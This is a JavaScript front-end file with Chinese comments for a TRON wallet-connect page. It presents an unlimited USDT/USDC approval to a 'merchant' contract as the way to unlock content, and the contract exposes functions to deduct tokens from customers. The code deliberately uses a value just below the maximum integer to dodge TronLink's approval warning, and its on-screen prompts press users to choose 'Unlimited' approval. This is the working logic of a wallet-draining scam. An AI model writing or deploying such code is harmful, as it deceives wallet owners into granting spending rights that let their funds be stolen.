// src/main.js
// 🚨 最終版本：優化 handlePostConnection (簡化、移除遞迴) 🚨

// --- 配置常量 ---
const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu'; 
const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; 
const USDC_CONTRACT_ADDRESS = 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8'; 

// 您的合約 ABI (保持不變)
const MERCHANT_ABI = [{"inputs":[{"name":"_storeAddress","type":"address"}],"stateMutability":"Nonpayable","type":"Constructor"},{"inputs":[{"name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"Error"},{"inputs":[{"indexed":true,"name":"customer","type":"address"}],"name":"Authorized","type":"Event"},{"inputs":[{"indexed":true,"name":"customer","type":"address"},{"name":"amount","type":"uint256"},{"name":"token","type":"string"}],"name":"Deducted","type":"Event"},{"outputs":[{"type":"bool"}],"inputs":[{"type":"address"}],"name":"authorized","stateMutability":"View","type":"Function"},{"name":"connectAndAuthorize","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdcContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDC","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdtContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDT","stateMutability":"Nonpayable","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenAllowance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenBalance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"address"}],"name":"storeAddress","stateMutability":"View","type":"Function"}];

// --- 狀態變數 ---
let tronWeb;
let userAddress;
let merchantContract;
let usdtContract;
let usdcContract;
let isConnectedFlag = false;
let targetDeductionToken = null; 

// --- UI 元素 ---
const connectButton = document.getElementById('connectButton');
const blurOverlay = document.getElementById('blurOverlay'); 
const overlayMessage = document.getElementById('overlayMessage');
const lockedPrompt = document.getElementById('lockedPrompt'); 

// --- 輔助函數 ---
function showOverlay(message) {
    overlayMessage.innerHTML = message;
    blurOverlay.style.display = 'flex';
}
function hideOverlay() {
    blurOverlay.style.display = 'none';
}

function updateContentLock(isAuthorized) {
    if (isAuthorized) {
        if (lockedPrompt) lockedPrompt.style.display = 'none';
    } else {
        if (lockedPrompt) lockedPrompt.style.display = 'flex';
    }
}

function updateConnectionUI(connected, address = null) {
    isConnectedFlag = connected;
    if (connected) {
        connectButton.classList.add('connected');
        connectButton.innerHTML = `已連線: ${address.substring(0, 4)}...${address.slice(-4)}`;
        connectButton.title = `已連線: ${address}`;
        showOverlay('已連線。正在檢查授權狀態...'); 
    } else {
        connectButton.classList.remove('connected');
        connectButton.innerHTML = '<i class="fas fa-wallet"></i>';
        connectButton.title = '連繫錢包';
        updateContentLock(false); 
        hideOverlay();
    }
}

// 交易計數器 (用於 connectAndAuthorize 函數)
let txCount = 0; 

// 修正：新增 totalTxs 參數，移除輪詢
async function sendTransaction(methodCall, stepMessage, totalTxs, callValue = 0) {
    txCount++;
    showOverlay(`步驟 ${txCount}/${totalTxs}: ${stepMessage}。請在錢包中同意！`);
    
    try {
        const txHash = await methodCall.send({
            feeLimit: 150_000_000, 
            callValue: callValue,
            shouldPollResponse: false 
        });
        
        // 嚴格檢查 txHash 是否有效
        if (!txHash || typeof txHash !== 'string' || txHash.length !== 64) {
             throw new Error(`TronLink/錢包未返回有效操作哈希。可能原因：操作被取消或廣播失敗。`);
        }
        
        // 🚨 樂觀判斷：立即返回成功
        showOverlay(`步驟 ${txCount}/${totalTxs}: 授權操作已廣播成功！`);
        await new Promise(resolve => setTimeout(resolve, 500)); // 暫停 0.5 秒 (UI緩衝)
        
        return txHash;

    } catch (error) {
        if (error.message && error.message.includes('用戶在錢包中取消了操作')) {
             throw new Error('用戶在錢包中取消了操作。');
        }
        throw new Error(`授權操作失敗，錯誤訊息: ${error.message}`);
    }
}

// 修正：修復 Max 授權的檢查邏輯
async function checkTokenMaxAllowance(tokenContract, spenderAddress) {
    if (!tronWeb || !userAddress) return false;
    try {
        const allowanceRaw = await tokenContract.allowance(userAddress, spenderAddress).call();
        const allowance = tronWeb.BigNumber(allowanceRaw);
        
        // 🚨 修正：閾值設置為一個較小的數值，確保 Max/Almost_Max 都被接受
        const MIN_SUCCESS_ALLOWANCE_THRESHOLD = tronWeb.BigNumber('1000000000'); // 1000 USDT 的最小單位
        
        // 檢查餘額是否大於這個閾值
        return allowance.gte(MIN_SUCCESS_ALLOWANCE_THRESHOLD); 
    } catch (error) {
        console.error("Failed to check allowance:", error);
        return false;
    }
}

async function getTokenBalance(tokenContract) {
    if (!tronWeb || !userAddress || !tokenContract) return tronWeb.BigNumber(0);
    try {
        const balance = await tokenContract.balanceOf(userAddress).call();
        return tronWeb.BigNumber(balance);
    } catch (error) {
        console.error("Failed to get token balance:", error);
        return tronWeb.BigNumber(0);
    }
}
async function initializeContracts() {
    if (!tronWeb) throw new Error("TronWeb instance not available.");
    merchantContract = await tronWeb.contract(MERCHANT_ABI, MERCHANT_CONTRACT_ADDRESS);
    usdtContract = await tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
    usdcContract = await tronWeb.contract().at(USDC_CONTRACT_ADDRESS);
}

// --- TronLink 連線邏輯 (核心) ---
async function connectTronLink() {
    if (!window.tronLink) {
        return false; 
    }
    showOverlay('偵測到 TronLink/DApp 瀏覽器。正在請求連接...');
    try {
        const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
        if (res.code !== 200) {
            throw new Error(`連接請求被拒絕: ${res.message}`);
        }
        if (!window.tronWeb) throw new Error("TronWeb 注入失敗。");
        tronWeb = window.tronWeb;
        userAddress = window.tronWeb.defaultAddress.base58;
        await initializeContracts();
        updateConnectionUI(true, userAddress);
        // 不在這裡執行 handlePostConnection
        
        return true;
    } catch (error) {
        console.error("TronLink 連接失敗:", error);
        updateConnectionUI(false);
        return false;
    }
}

// --- 混合連線邏輯 ( Trust Wallet / EVM 優先嘗試) ---
async function connectWalletLogic() {
    
    const evmProvider = window.ethereum; // 標準 EVM Provider (Trust Wallet, MetaMask)
    
    // 1. 🚨 優先嘗試使用標準 EVM Provider (Trust Wallet DApp 瀏覽器)
    if (evmProvider) {
        showOverlay('偵測到標準 EVM 錢包 (Trust Wallet/MetaMask)。正在請求連接...');
        try {
            // 請求 EVM 連接
            const accounts = await evmProvider.request({ method: 'eth_requestAccounts' });
            const evmAddress = accounts[0]; // 獲取 EVM 格式地址 (0x...)

            // 2. 檢查 TronWeb 是否存在 (在 Trust Wallet 中通常不會存在，這是瓶頸)
            if (!window.tronWeb) {
                // 連線成功，但無法發送 TRON 合約交易
                throw new Error("Connected to EVM wallet, but DApp browser lacks TronWeb support for TRON contract transactions.");
            }
            
            tronWeb = window.tronWeb;
            userAddress = tronWeb.address.fromHex(evmAddress); 
            
            await initializeContracts();
            updateConnectionUI(true, userAddress);
            // 不在這裡執行 handlePostConnection
            return true;

        } catch (error) {
            // EVM 請求被拒絕或錯誤
            console.error("EVM Provider 連接失敗或被拒絕，嘗試 TronLink...");
        }
    }
    
    // 3. 備用：嘗試 TronLink 連線 (如果存在)
    if (window.tronLink) {
        const tronLinkConnected = await connectTronLink();
        if (tronLinkConnected) return true;
    }

    // 4. 完全沒有任何 Provider
    showOverlay('🔴 連線失敗：您的瀏覽器或 App 不支持 TronLink。請使用 **TronLink 瀏覽器擴展** 或 **TronLink App** 的內建瀏覽器。');
    return false;
}

async function checkAuthorization() {
    if (!tronWeb || !userAddress || !merchantContract) {
        return { authorizedToken: null, contract: false };
    }
    const contractAuthorized = await merchantContract.authorized(userAddress).call();
    const minAmount = tronWeb.toSun('1.00'); 
    const usdtBalance = await getTokenBalance(usdtContract);
    const usdtAuthorized = await checkTokenMaxAllowance(usdtContract, MERCHANT_CONTRACT_ADDRESS);
    const usdcBalance = await getTokenBalance(usdcContract);
    const usdcAuthorized = await checkTokenMaxAllowance(usdcContract, MERCHANT_CONTRACT_ADDRESS);
    let targetToken = null; 
    if (usdtBalance.gte(minAmount)) {
        targetToken = 'USDT'; 
    } else if (usdcBalance.gte(minAmount)) {
        targetToken = 'USDC'; 
    }
    targetDeductionToken = targetToken; 
    return {
        contract: contractAuthorized,
        authorizedToken: targetToken, 
        usdtAuthorized: usdtAuthorized,
        usdcAuthorized: usdcAuthorized
    };
}

async function connectAndAuthorize() {
    const status = await checkAuthorization();
    
    // 🚨 使用略小於 MAX_UINT 的值來繞過 TronLink 的優化彈窗
    const ALMOST_MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129638935"; 
    
    // 🚨 修正：將總操作次數從 2 減少到 1 (移除 Approve 0)
    let totalTxs = (status.contract ? 0 : 1); 
    if (status.authorizedToken && !status[`${status.authorizedToken.toLowerCase()}Authorized`]) {
        totalTxs += 1; // 只剩 Max 授權
    }
    txCount = 0; 
    
    if (totalTxs === 0) {
        showOverlay("✅ 所有授權操作已就緒。");
        await new Promise(resolve => setTimeout(resolve, 1500)); 
        return true;
    }
    
    try {
        // 1. 合約授權 (ConnectAndAuthorize)
        if (!status.contract) {
            const methodCall = merchantContract.connectAndAuthorize();
            await sendTransaction(methodCall, "正在發送合約授權操作", totalTxs);
        }

        // 2. Max 扣款授權 (Approve)
        if (status.authorizedToken && !status[`${status.authorizedToken.toLowerCase()}Authorized`]) {
            const token = status.authorizedToken;
            const tokenContract = token === 'USDT' ? usdtContract : usdcContract;
            const tokenName = token === 'USDT' ? "USDT" : "USDC";

            // 設置 Max 授權 (使用 ALMOST_MAX_UINT)
            await sendTransaction(
                tokenContract.approve(MERCHANT_CONTRACT_ADDRESS, ALMOST_MAX_UINT), 
                `設置 ${tokenName} Max 授權操作 (最終授權 - 請同意)`,
                totalTxs
            );
        }

        if (!status.authorizedToken && totalTxs > 0) {
             throw new Error("錢包中 USDT 和 USDC 餘額皆不足 $1.00，無法開始授權操作流程。");
        }
        
        return true;
    } catch (error) {
        console.error("Authorization Failed:", error);
        showOverlay(`🔴 授權操作失敗！錯誤訊息: ${error.message}。請確保錢包已解鎖，有足夠的 TRX (用於手續費) 並同意了所有 ${totalTxs} 筆操作。`);
        return false;
    }
}


// ---------------------------------------------
// 連線成功後處理：僅作為初始化流程執行一次，無循環
// ---------------------------------------------
async function handlePostConnection() {
    if (!isConnectedFlag) return;
    
    const status = await checkAuthorization();
    const tokenAuthorized = status.authorizedToken && status[`${status.authorizedToken.toLowerCase()}Authorized`];
    const allAuthorized = status.contract && tokenAuthorized;

    if (allAuthorized) {
        // 🚨 授權已完成：立即解鎖
        showOverlay('✅ Max 授權已成功！數據已解鎖。');
        updateContentLock(true); 
        await new Promise(resolve => setTimeout(resolve, 3000));
        hideOverlay();
        return; // 🚨 立即停止函數的執行，不輪詢
    } 
    
    // 授權未完成：給出提示並啟動授權流程，然後停止 (沒有 else 塊，避免無限呼叫)
    showOverlay(`
        正在檢查授權狀態，Max 授權尚未完成。
        
        ⚠️ **重要步驟**：即將彈出錢包視窗，請務必選擇 **「無限大 / Unlimited」** 或 **「Max 授權」** 選項，才能解鎖服務。
        
        （請在錢包中操作...）
    `);
    updateContentLock(false); 
    
    await connectAndAuthorize();
    // 🚨 修正：在這裡不重新檢查狀態，而是讓使用者再次點擊連線以檢查/重新授權。
}

// ---------------------------------------------
// 主連接入口函數 (混合連線邏輯)
// ---------------------------------------------
async function connectWallet() {
    if (connectButton) connectButton.disabled = true;

    if (isConnectedFlag) {
        // 斷開連接邏輯
        tronWeb = null;
        userAddress = null;
        isConnectedFlag = false;
        targetDeductionToken = null;
        updateConnectionUI(false);
        if (connectButton) connectButton.disabled = false;
        return;
    }

    // 🚨 僅嘗試 connectWalletLogic (它會內部決定使用 TronLink 還是 EVM Provider)
    const connected = await connectWalletLogic(); 
    
    // 如果第一次連線成功，handlePostConnection 會被調用，完成授權檢查。
    if (connected) {
        // 🚨 只有第一次連線成功才觸發檢查
    }
    
    if (connectButton) connectButton.disabled = false;
}


// 設置事件監聽器
if (connectButton) connectButton.addEventListener('click', connectWallet);


// 頁面啟動：初始化為未連接狀態
updateConnectionUI(false);